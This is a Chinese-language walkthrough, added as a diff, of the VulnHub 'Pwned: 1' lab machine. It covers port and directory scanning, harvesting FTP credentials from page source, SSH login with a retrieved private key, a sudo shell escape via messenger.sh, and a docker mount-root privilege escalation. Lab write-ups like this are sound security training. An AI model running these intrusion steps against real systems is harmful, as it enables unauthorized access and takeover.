@@ -1,0 +1,409 @@
+## 复盘*
+
+## 靶机地址
+
+[Pwned：1 ~ VulnHub](https://www.vulnhub.com/entry/pwned-1,507/#top)
+
+
+
+
+
+## 信息收集
+
+
+
+
+
+### 主机探活
+
+```
+arp-scan -l --interface=eth1
+```
+
+![image-20250308210848082](./assets/image-20250308210848082.png)
+
+
+
+确定靶机ip：
+
+```
+192.168.56.144
+```
+
+
+
+
+
+### 扫描主机开放端口
+
+```
+nmap -sS -sV -p- -Pn 192.168.56.144
+```
+
+![image-20250308211020597](./assets/image-20250308211020597.png)
+
+开放了
+
+```
+21 ftp
+22 ssh
+80 http
+```
+
+
+
+
+
+### nmap加入-A参数重新扫描三个端口
+
+```
+nmap -p 21,22,80 -A 192.168.56.144
+```
+
+![image-20250308211244030](./assets/image-20250308211244030.png)
+
+
+
+
+
+### 尝试匿名登录ftp服务
+
+```
+lftp 192.168.56.144 -u anonymous
+```
+
+![image-20250308211159279](./assets/image-20250308211159279.png)
+
+失败
+
+
+
+### 访问192.168.56.144
+
+![image-20250308211321133](./assets/image-20250308211321133.png)
+
+
+
+最后一条消息来自攻击者：
+
+               我是Annlynn。我是那个侵入了你们服务器的黑客，你们的员工不知道我是怎么利用他们的。  
+               现在他们对此感到担心。在找到我之前，先调查一下你们的员工吧。（哈哈）然后再来找我，Boomers XD..!!
+
+
+
+查看源码：
+
+![image-20250308211435828](./assets/image-20250308211435828.png)
+
+```
+<!-- 我忘了在最后的消息中添加这个 你比我想象中还聪明 所以我留给你这个 她唱得非常好。我喜欢。 -->
+```
+
+
+
+### 扫描网站目录
+
+```
+dirsearch -u 192.168.56.144
+```
+
+![image-20250308211551919](./assets/image-20250308211551919.png)
+
+存在：
+
+- robots.txt
+
+
+
+### 访问robots.txt
+
+![image-20250308211657461](./assets/image-20250308211657461.png)
+
+
+
+存在/nothing目录
+
+访问
+
+![image-20250308211725654](./assets/image-20250308211725654.png)
+
+
+
+存在nothing.html，访问![image-20250308211743739](./assets/image-20250308211743739.png)
+
+
+
+查看源码，无关键信息
+
+![image-20250308211751814](./assets/image-20250308211751814.png)
+
+
+
+### 利用gobuster再次进行目录扫描
+
+```
+gobuster dir -u 192.168.56.144/ -w=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+```
+
+![image-20250308211908471](./assets/image-20250308211908471.png)
+
+![image-20250308211933262](./assets/image-20250308211933262.png)
+
+
+
+存在：
+
+- hidden_text目录
+
+
+
+### 访问hidden_text
+
+![image-20250308212033607](./assets/image-20250308212033607.png)
+
+
+
+存在secret.dic文件
+
+
+
+### 访问secret.dic
+
+![image-20250308212119893](./assets/image-20250308212119893.png)
+
+
+
+目录字典文件
+
+
+
+
+
+### wget下载secret.dic
+
+```
+wget 192.168.56.144/hidden_text/secret.dic
+```
+
+![image-20250308212205882](./assets/image-20250308212205882.png)
+
+
+
+### 利用gobuster爆破目录
+
+![image-20250308212247566](./assets/image-20250308212247566.png)
+
+存在
+
+- pwned.vuln
+
+
+
+### 访问pwned.vuln
+
+![image-20250308212325177](./assets/image-20250308212325177.png)
+
+登录页面
+
+查看源码
+
+![image-20250308212345021](./assets/image-20250308212345021.png)
+
+```
+用户名：ftpuser
+密码：B0ss_B!TcH
+```
+
+
+
+尝试登录该页面
+
+失败
+
+
+
+
+
+### 尝试登录ftp服务
+
+![image-20250308212614609](./assets/image-20250308212614609.png)
+
+成功
+
+
+
+
+
+### 查看ftp中的文件
+
+```
+ls
+cd share
+ls
+get id_rsa
+get note.txt
+exit
+```
+
+![image-20250308212652583](./assets/image-20250308212652583.png)
+
+
+
+### 查看note.txt文件
+
+![image-20250308212741533](./assets/image-20250308212741533.png)
+
+提示存在ariana用户
+
+
+
+### 尝试利用密钥免密登录
+
+```
+ssh arana@192.168.56.144 -i id_rsa
+```
+
+![](./assets/image-20250308213001230.png)
+
+密钥权限问题
+
+登录失败
+
+
+
+
+
+修改密钥权限
+
+```
+ls -al
+chmod 600 id_rsa
+```
+
+![image-20250308213038673](./assets/image-20250308213038673.png)![image-20250308213106788](./assets/image-20250308213106788.png)
+
+
+
+
+
+### 重新尝试免密登录ariana
+
+![image-20250308213123449](./assets/image-20250308213123449.png)
+
+成功
+
+
+
+## 提权
+
+### 得到第一个flag
+
+```
+ls
+cat user1.txt
+```
+
+![image-20250308213200052](./assets/image-20250308213200052.png)
+
+
+
+
+
+有一个ariana-personal.diary文件查看
+
+![image-20250308213235137](./assets/image-20250308213235137.png)
+
+提示有一个hidden_text文件
+
+
+
+### 利用find查找hidden_text文件路径
+
+```
+find / -name "hidden_text" 2>/dev/null
+```
+
+![image-20250308213356430](./assets/image-20250308213356430.png)
+
+
+
+
+
+### 查看hidden_text下面的secret.dic
+
+![image-20250308213426168](./assets/image-20250308213426168.png)
+
+
+
+已经得到这个文件了，没用
+
+
+
+
+
+### 执行sudo -l
+
+```
+sudo -l
+```
+
+![image-20250308213529357](./assets/image-20250308213529357.png)
+
+
+
+提示可以免密码以selena的身份执行/home/messenger.sh文件
+
+
+
+### 查看messenger.sh文件
+
+```
+cd /home
+cat messenger.sh
+```
+
+![image-20250308213619501](./assets/image-20250308213619501.png)
+
+
+
+
+
+### 以selena的身份利用该脚本开启一个shell
+
+```
+sudo -u selena ./messenger.sh
+a
+bash
+whoami
+id
+```
+
+
+
+![image-20250308213735631](./assets/image-20250308213735631.png)
+
+![](./assets/image-20250308213820772.png)
+
+
+
+### 利用docker提权
+
+[docker | GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell)
+
+```
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+whoami
+```
+
+![image-20250308214013316](./assets/image-20250308214013316.png)
+
+
+
+提权成功
+
+
+
+### 得到最后一个flag
+
+![image-20250308214047841](./assets/image-20250308214047841.png)
+
